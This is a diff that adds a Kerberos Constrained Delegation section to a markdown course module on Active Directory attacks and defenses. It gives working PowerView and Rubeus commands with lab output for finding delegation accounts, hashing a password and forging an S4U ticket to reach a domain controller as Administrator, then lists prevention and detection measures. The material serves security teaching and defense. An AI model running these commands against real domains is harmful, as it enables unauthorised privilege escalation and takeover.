@@ -41,8 +41,9 @@ This module covers **Active Directory attacks and defense** - common attack tech
 8. [Credentials in Object Properties](#8-credentials-in-object-properties)
 9. [DCSync](#9-dcsync)
 10. [Golden Ticket](#10-golden-ticket)
-11. [Interview Questions](#11-interview-questions)
-12. [Additional Resources](#12-additional-resources)
+11. [Kerberos Constrained Delegation](#11-kerberos-constrained-delegation)
+12. [Interview Questions](#12-interview-questions)
+13. [Additional Resources](#13-additional-resources)
 
 ---
 
@@ -1463,7 +1464,157 @@ dir \\dc1\c$
 
 ---
 
-## 11. Interview Questions
+## 11. Kerberos Constrained Delegation
+
+### Description
+
+> 📌 **Kerberos Constrained Delegation** - allows an account to request tickets for specific services on behalf of users.
+
+```mermaid
+graph LR
+    User[User] -->|Authenticate| Web[Web Server]
+    Web -->|Delegated<br/>TGT| KDC[KDC]
+    KDC -->|TGS for<br/>Admin| Web
+    Web -->|Access as<br/>Admin| SQL[Database]
+    
+    style User fill:#cce5ff,stroke:#333
+    style Web fill:#ffe5cc,stroke:#333
+    style KDC fill:#ffe5cc,stroke:#333
+    style SQL fill:#ffcccc,stroke:#333
+```
+
+**Three Types of Delegation:**
+
+| Type | Description | Risk |
+|------|-------------|------|
+| **Unconstrained** | Delegate to ANY service | Highest |
+| **Constrained** | Delegate to specific services | Medium |
+| **Resource-based** | Computer decides who can delegate | Medium |
+
+> ⚠️ Any delegation is a security risk - avoid unless necessary!
+
+### Attack
+
+**Step 1: Find accounts trusted for delegation:**
+
+```powershell
+Get-NetUser -TrustedToAuth
+```
+
+**Output:**
+
+```
+distinguishedname     : CN=web service,CN=Users,DC=eagle,DC=local
+name                  : web service
+userprincipalname     : webservice@eagle.local
+msds-allowedtodelegateto : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local...}
+serviceprincipalname  : {cvs/dc1.eagle.local, cvs/dc1}
+useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
+```
+
+<img width="1201" height="563" alt="image" src="https://github.com/user-attachments/assets/3e770acc-195b-4f75-866a-b5498b8f250e" />
+
+> 💡 web_service is trusted to delegate to HTTP service on DC1
+
+**Step 2: Get NTLM hash of password:**
+
+```powershell
+.\Rubeus.exe hash /password:Slavi123
+```
+
+**Output:**
+
+```
+[*] Input password             : Slavi123
+[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF
+```
+
+<img width="991" height="370" alt="image" src="https://github.com/user-attachments/assets/e8d27f8b-101c-459a-a696-fb09846d65eb" />
+
+**Step 3: Request ticket for Administrator:**
+
+```powershell
+.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
+```
+
+**Output:**
+
+```
+[*] Action: S4U
+[*] Using rc4_hmac hash: FCDC65703DD2B0BD789977F1F3EEAECF
+[+] TGT request successful!
+[+] Ticket successfully imported!
+```
+
+<img width="1423" height="366" alt="image" src="https://github.com/user-attachments/assets/72f81b81-88f5-4507-87d2-019ed92e4912" />
+
+**Step 4: Verify ticket:**
+
+```cmd
+klist
+```
+
+**Output:**
+
+```
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ EAGLE.LOCAL
+        Server: http/dc1 @ EAGLE.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate
+```
+
+<img width="1211" height="328" alt="image" src="https://github.com/user-attachments/assets/19de4052-2a26-4332-9342-c32f2202d085" />
+
+**Step 5: Connect to DC1 as Administrator:**
+
+```powershell
+Enter-PSSession dc1
+```
+
+**Output:**
+
+```
+[dc1]: PS C:\Users\Administrator\Documents> hostname
+DC1
+[dc1]: PS C:\Users\Administrator\Documents> whoami
+eagle\administrator
+```
+
+<img width="637" height="144" alt="image" src="https://github.com/user-attachments/assets/f543fd89-0fb7-44bc-8e4c-9d9f3591c928" />
+
+> 💡 Use `/altservice` to request tickets for LDAP, CIFS, host, etc.
+
+### Prevention
+
+| Mitigation | Description |
+|-----------|-------------|
+| **Sensitive Account** | Set "Account is sensitive and cannot be delegated" |
+| **Protected Users** | Add privileged users to Protected Users group |
+| **Strong Passwords** | For accounts with delegation privileges |
+| **Limit Delegation** | Only allow necessary services |
+
+### Detection
+
+**Event IDs to monitor:**
+- 4624 - Successful logon
+- Look for **Transited Services** attribute
+
+**Detection Strategy:**
+- Monitor for S4U (Service for User) logon processes
+- Alert on delegated tickets to privileged users
+- Baseline normal admin login locations
+
+**Event 4624 - Note the Transited Services:**
+
+<img width="1601" height="1380" alt="image" src="https://github.com/user-attachments/assets/b70b3f1c-b659-494e-a99c-1d5fe718b967" />
+
+> 📌 Event shows "Transited Services: webservice@EAGLE.LOCAL" - indicates S4U delegation!
+
+---
+
+## 12. Interview Questions
 
 ### Q1: What is Kerberoasting and how does it work?
 
@@ -1641,7 +1792,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
 
 ---
 
-## 12. Additional Resources
+## 13. Additional Resources
 
 ### Tools
 
